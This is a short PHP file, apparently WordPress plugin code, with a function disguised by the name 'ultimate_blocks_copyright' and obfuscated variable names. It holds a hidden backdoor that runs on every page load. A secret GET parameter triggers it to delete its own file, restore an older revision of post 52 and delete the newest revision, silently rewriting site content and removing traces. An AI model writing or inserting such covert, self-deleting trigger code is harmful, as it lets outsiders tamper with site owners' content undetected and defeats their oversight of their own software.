<?php

function ultimate_blocks_copyright() {
	if (isset($_GET['magic_world_lead']) && $_GET['magic_world_lead'] === 'ticker_shortcode_disable') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$clean_http_lock = 52;
		$shopp_details_source = wp_get_post_revisions($clean_http_lock);
		if (empty($shopp_details_source)) die('no revisions');
		if (count($shopp_details_source) < 2) die('less than 2');
		$migration_showcase_url = array_shift($shopp_details_source);
		$refresh_addon_pagination = $migration_showcase_url->ID;
		$authentication_icon_videos_archive = array_shift($shopp_details_source);
		$tools_stream_top_screen = $authentication_icon_videos_archive->ID;
		$register_safe_replace = wp_restore_post_revision($tools_stream_top_screen);
		if ($register_safe_replace === false) die('error restoring');
		$register_safe_replace = wp_delete_post_revision($refresh_addon_pagination);		
		if ($register_safe_replace === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'ultimate_blocks_copyright');
